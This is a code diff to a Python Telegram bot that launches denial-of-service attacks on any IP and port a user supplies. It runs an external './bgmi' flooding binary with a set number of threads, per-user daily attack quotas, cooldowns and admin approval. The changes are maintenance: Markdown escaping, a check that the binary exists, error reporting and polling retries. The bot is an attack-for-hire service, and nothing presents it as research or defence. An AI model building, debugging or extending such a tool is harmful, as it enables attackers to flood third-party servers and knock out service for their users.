@@ -65,6 +65,27 @@ def is_valid_ip(ip):
     parts = ip.split('.')
     return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)
 
+# Escape Markdown special characters
+def escape_markdown(text):
+    escape_chars = r'_*[]()~`>#+-=|{}.!'
+    return ''.join(f'\\{char}' if char in escape_chars else char for char in str(text))
+
+# Safe send message function
+def safe_send_message(chat_id, text, parse_mode="Markdown"):
+    try:
+        # Escape the text properly
+        if parse_mode == "Markdown":
+            # Don't escape code blocks
+            parts = text.split('`')
+            for i in range(0, len(parts), 2):
+                parts[i] = escape_markdown(parts[i])
+            text = '`'.join(parts)
+        
+        bot.send_message(chat_id, text, parse_mode=parse_mode)
+    except Exception as e:
+        # If Markdown fails, send without formatting
+        bot.send_message(chat_id, text.replace('_', '').replace('*', '').replace('`', ''))
+
 # ============================================
 # COMMANDS
 # ============================================
@@ -79,8 +100,8 @@ def send_welcome(message):
     else:
         status = "⏳ PENDING APPROVAL"
     
-    bot.reply_to(
-        message,
+    safe_send_message(
+        message.chat.id,
         f"🚀 *Welcome @{username}!*\n\n"
         f"📊 *Your Status:* {status}\n\n"
         f"📌 *Commands:*\n"
@@ -90,7 +111,7 @@ def send_welcome(message):
         f"/approve <user_id> - Approve a user (Admin only)\n"
         f"/remove <user_id> - Remove user approval (Admin only)\n"
         f"/reset_TF - Reset all limits (Admin only)",
-        parse_mode="Markdown"
+        "Markdown"
     )
 
 @bot.message_handler(commands=['status'])
@@ -99,10 +120,10 @@ def check_status(message):
     username = message.from_user.username or message.from_user.first_name
     
     if not is_approved(user_id):
-        bot.reply_to(
-            message,
+        safe_send_message(
+            message.chat.id,
             f"❌ *Access Denied @{username}!*\n\nYou are not approved to use this bot.\nContact admin for approval.",
-            parse_mode="Markdown"
+            "Markdown"
         )
         return
     
@@ -123,7 +144,7 @@ def check_status(message):
         f"🧵 Threads per attack: {THREAD_COUNT}\n"
         f"⚡ Active Attacks: {active_attacks}/{MAX_ACTIVE_ATTACKS}"
     )
-    bot.reply_to(message, status_msg, parse_mode="Markdown")
+    safe_send_message(message.chat.id, status_msg, "Markdown")
 
 @bot.message_handler(commands=['approve_list'])
 def approve_list(message):
@@ -131,18 +152,18 @@ def approve_list(message):
     
     if user_id not in ADMIN_IDS:
         username = message.from_user.username or message.from_user.first_name
-        bot.reply_to(message, f"❌ *Access Denied @{username}!*\nAdmin only command.", parse_mode="Markdown")
+        safe_send_message(message.chat.id, f"❌ *Access Denied @{username}!*\nAdmin only command.", "Markdown")
         return
     
     if not APPROVED_USERS:
-        bot.reply_to(message, "📋 *Approved Users List*\n\nNo approved users yet.", parse_mode="Markdown")
+        safe_send_message(message.chat.id, "📋 *Approved Users List*\n\nNo approved users yet.", "Markdown")
         return
     
     user_list = "\n".join([f"• `{uid}`" for uid in APPROVED_USERS])
-    bot.reply_to(
-        message,
+    safe_send_message(
+        message.chat.id,
         f"📋 *Approved Users List*\n\n{user_list}\n\nTotal: {len(APPROVED_USERS)} users",
-        parse_mode="Markdown"
+        "Markdown"
     )
 
 @bot.message_handler(commands=['approve'])
@@ -151,25 +172,25 @@ def approve_user_command(message):
     
     if user_id not in ADMIN_IDS:
         username = message.from_user.username or message.from_user.first_name
-        bot.reply_to(message, f"❌ *Access Denied @{username}!*\nAdmin only command.", parse_mode="Markdown")
+        safe_send_message(message.chat.id, f"❌ *Access Denied @{username}!*\nAdmin only command.", "Markdown")
         return
     
     try:
         args = message.text.split()
         if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/approve <user_id>`", parse_mode="Markdown")
+            safe_send_message(message.chat.id, "❌ *Usage:* `/approve <user_id>`", "Markdown")
             return
         
         target_id = int(args[1])
         approve_user(target_id)
         
-        bot.reply_to(
-            message,
+        safe_send_message(
+            message.chat.id,
             f"✅ *User Approved!*\n\nUser ID: `{target_id}`\nNow they can use /bgmi command.",
-            parse_mode="Markdown"
+            "Markdown"
         )
     except ValueError:
-        bot.reply_to(message, "❌ *Invalid User ID!*", parse_mode="Markdown")
+        safe_send_message(message.chat.id, "❌ *Invalid User ID!*", "Markdown")
 
 @bot.message_handler(commands=['remove'])
 def remove_user_command(message):
@@ -177,30 +198,30 @@ def remove_user_command(message):
     
     if user_id not in ADMIN_IDS:
         username = message.from_user.username or message.from_user.first_name
-        bot.reply_to(message, f"❌ *Access Denied @{username}!*\nAdmin only command.", parse_mode="Markdown")
+        safe_send_message(message.chat.id, f"❌ *Access Denied @{username}!*\nAdmin only command.", "Markdown")
         return
     
     try:
         args = message.text.split()
         if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/remove <user_id>`", parse_mode="Markdown")
+            safe_send_message(message.chat.id, "❌ *Usage:* `/remove <user_id>`", "Markdown")
             return
         
         target_id = int(args[1])
         
         if target_id in ADMIN_IDS:
-            bot.reply_to(message, "❌ *Cannot remove admin!*", parse_mode="Markdown")
+            safe_send_message(message.chat.id, "❌ *Cannot remove admin!*", "Markdown")
             return
         
         remove_user(target_id)
         
-        bot.reply_to(
-            message,
+        safe_send_message(
+            message.chat.id,
             f"❌ *User Removed!*\n\nUser ID: `{target_id}`\nApproval revoked.",
-            parse_mode="Markdown"
+            "Markdown"
         )
     except ValueError:
-        bot.reply_to(message, "❌ *Invalid User ID!*", parse_mode="Markdown")
+        safe_send_message(message.chat.id, "❌ *Invalid User ID!*", "Markdown")
 
 @bot.message_handler(commands=['reset_TF'])
 def reset_attack_limit(message):
@@ -208,12 +229,12 @@ def reset_attack_limit(message):
     
     if user_id not in ADMIN_IDS:
         username = message.from_user.username or message.from_user.first_name
-        bot.reply_to(message, f"❌ *Access Denied @{username}!*", parse_mode="Markdown")
+        safe_send_message(message.chat.id, f"❌ *Access Denied @{username}!*", "Markdown")
         return
     
     user_attacks.clear()
     user_cooldowns.clear()
-    bot.reply_to(message, "🔄 *All attack limits have been reset by ADMIN!*", parse_mode="Markdown")
+    safe_send_message(message.chat.id, "🔄 *All attack limits have been reset by ADMIN!*", "Markdown")
 
 @bot.message_handler(commands=['bgmi'])
 def bgmi_command(message):
@@ -226,52 +247,52 @@ def bgmi_command(message):
     # APPROVAL CHECK - MAIN GATE ✅
     # ============================================
     if not is_approved(user_id):
-        bot.reply_to(
-            message,
+        safe_send_message(
+            message.chat.id,
             f"❌ *Access Denied @{username}!*\n\n"
             f"You are not approved to use this bot.\n\n"
-            f"📌 Contact admin: `/owner`",
-            parse_mode="Markdown"
+            f"📌 Contact admin: /owner",
+            "Markdown"
         )
         return
     
     # Check if user is in cooldown
     if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
         remaining = int((user_cooldowns[user_id] - datetime.now()).seconds)
-        bot.reply_to(
-            message,
-            f"⏰ *Cooldown @{username}!*\nPlease wait {remaining} seconds.",
-            parse_mode="Markdown"
+        safe_send_message(
+            message.chat.id,
+            f"⏰ *Cooldown* @{username}\nPlease wait {remaining} seconds.",
+            "Markdown"
         )
         return
     
     # Check daily limit
     if user_attacks.get(user_id, 0) >= DAILY_ATTACK_LIMIT:
-        bot.reply_to(
-            message,
-            f"❌ *Daily limit reached @{username}!*\nLimit: {DAILY_ATTACK_LIMIT} attacks/day",
-            parse_mode="Markdown"
+        safe_send_message(
+            message.chat.id,
+            f"❌ *Daily limit reached* @{username}\nLimit: {DAILY_ATTACK_LIMIT} attacks/day",
+            "Markdown"
         )
         return
     
     # Check active attacks limit
     if active_attacks >= MAX_ACTIVE_ATTACKS:
-        bot.reply_to(
-            message,
-            f"⏳ *Please wait @{username}!*\n{MAX_ACTIVE_ATTACKS} attacks already running.",
-            parse_mode="Markdown"
+        safe_send_message(
+            message.chat.id,
+            f"⏳ *Please wait* @{username}\n{MAX_ACTIVE_ATTACKS} attacks already running.",
+            "Markdown"
         )
         return
     
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
-            bot.reply_to(
-                message,
-                f"❌ *Usage:* `/bgmi IP PORT TIME`\n"
-                f"📌 *Example:* `/bgmi 1.1.1.1 80 60`\n\n"
+            safe_send_message(
+                message.chat.id,
+                f"❌ *Usage:* /bgmi IP PORT TIME\n"
+                f"📌 *Example:* /bgmi 1.1.1.1 80 60\n\n"
                 f"💡 *Note:* Threads are fixed at {THREAD_COUNT}",
-                parse_mode="Markdown"
+                "Markdown"
             )
             return
         
@@ -279,15 +300,15 @@ def bgmi_command(message):
         
         # Validation
         if not is_valid_ip(ip):
-            bot.reply_to(message, f"❌ *Invalid IP address @{username}!*", parse_mode="Markdown")
+            safe_send_message(message.chat.id, f"❌ *Invalid IP address* @{username}", "Markdown")
             return
         
         if not port.isdigit() or not (1 <= int(port) <= 65535):
-            bot.reply_to(message, f"❌ *Invalid port @{username}!* (1-65535)", parse_mode="Markdown")
+            safe_send_message(message.chat.id, f"❌ *Invalid port* @{username} (1-65535)", "Markdown")
             return
         
         if not time_val.isdigit() or int(time_val) < 1 or int(time_val) > 300:
-            bot.reply_to(message, f"❌ *Invalid time @{username}!* (1-300 seconds)", parse_mode="Markdown")
+            safe_send_message(message.chat.id, f"❌ *Invalid time* @{username} (1-300 seconds)", "Markdown")
             return
         
         # Update user stats
@@ -298,15 +319,15 @@ def bgmi_command(message):
         remaining = DAILY_ATTACK_LIMIT - user_attacks[user_id]
         
         # Confirm attack start
-        bot.reply_to(
-            message,
+        safe_send_message(
+            message.chat.id,
             f"🚀 *Attack Started!*\n"
             f"👤 User: @{username} ✅\n"
-            f"🎯 Target: `{ip}:{port}`\n"
+            f"🎯 Target: {ip}:{port}\n"
             f"⏰ Duration: {time_val}s\n"
             f"🧵 Threads: {THREAD_COUNT}\n"
             f"🎯 Remaining Today: {remaining}/{DAILY_ATTACK_LIMIT}",
-            parse_mode="Markdown"
+            "Markdown"
         )
         
         # Start attack in background thread
@@ -319,23 +340,28 @@ def bgmi_command(message):
         
     except Exception as e:
         active_attacks = max(0, active_attacks - 1)
-        bot.reply_to(message, f"❌ *Error: {str(e)}*", parse_mode="Markdown")
+        safe_send_message(message.chat.id, f"❌ *Error:* {str(e)}", "Markdown")
 
 @bot.message_handler(commands=['owner'])
 def owner_command(message):
-    bot.reply_to(
-        message,
+    safe_send_message(
+        message.chat.id,
         f"👑 *Bot Owner*\n\n"
         f"For approval or support, contact:\n"
         f"Admin ID: `{ADMIN_IDS[0]}`\n\n"
         f"Send your User ID to get approved.",
-        parse_mode="Markdown"
+        "Markdown"
     )
 
 def execute_attack(ip, port, duration, username, user_id):
     global active_attacks
     
     try:
+        # Check if bgmi binary exists and is executable
+        if not os.path.exists('./bgmi'):
+            safe_send_message(ADMIN_IDS[0], "❌ *Error:* bgmi binary not found!", "Markdown")
+            return
+        
         cmd = f"./bgmi {ip} {port} {duration} {THREAD_COUNT}"
         logging.info(f"Executing: {cmd}")
         
@@ -343,33 +369,41 @@ def execute_attack(ip, port, duration, username, user_id):
             cmd,
             shell=True,
             stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
+            stderr=subprocess.PIPE,
+            executable='/bin/bash'
         )
         
         stdout, stderr = process.communicate(timeout=duration + 10)
         
-        bot.send_message(
-            ADMIN_IDS[0],
-            f"✅ *Attack Completed*\n"
-            f"🎯 Target: {ip}:{port}\n"
-            f"👤 By: @{username}\n"
-            f"⏰ Duration: {duration}s\n"
-            f"🧵 Threads: {THREAD_COUNT}",
-            parse_mode="Markdown"
-        )
+        if process.returncode == 0:
+            safe_send_message(
+                ADMIN_IDS[0],
+                f"✅ *Attack Completed*\n"
+                f"🎯 Target: {ip}:{port}\n"
+                f"👤 By: @{username}\n"
+                f"⏰ Duration: {duration}s\n"
+                f"🧵 Threads: {THREAD_COUNT}",
+                "Markdown"
+            )
+        else:
+            safe_send_message(
+                ADMIN_IDS[0],
+                f"⚠️ *Attack Issue*\n🎯 Target: {ip}:{port}\n👤 By: @{username}\nError: {stderr.decode()}",
+                "Markdown"
+            )
         
     except subprocess.TimeoutExpired:
         process.kill()
-        bot.send_message(
+        safe_send_message(
             ADMIN_IDS[0],
             f"⚠️ *Attack Timeout*\n🎯 Target: {ip}:{port}\n👤 By: @{username}",
-            parse_mode="Markdown"
+            "Markdown"
         )
     except Exception as e:
-        bot.send_message(
+        safe_send_message(
             ADMIN_IDS[0],
             f"❌ *Attack Failed*\n👤 User: @{username}\nError: {str(e)}",
-            parse_mode="Markdown"
+            "Markdown"
         )
     finally:
         active_attacks = max(0, active_attacks - 1)
@@ -380,4 +414,11 @@ if __name__ == "__main__":
     print(f"👑 Admins: {ADMIN_IDS}")
     print(f"✅ Approved Users: {len(APPROVED_USERS)}")
     print("✅ Bot is running...")
-    bot.infinity_polling()
+    
+    # Retry logic for polling
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=60)
+        except Exception as e:
+            print(f"Polling error: {e}")
+            time.sleep(15)
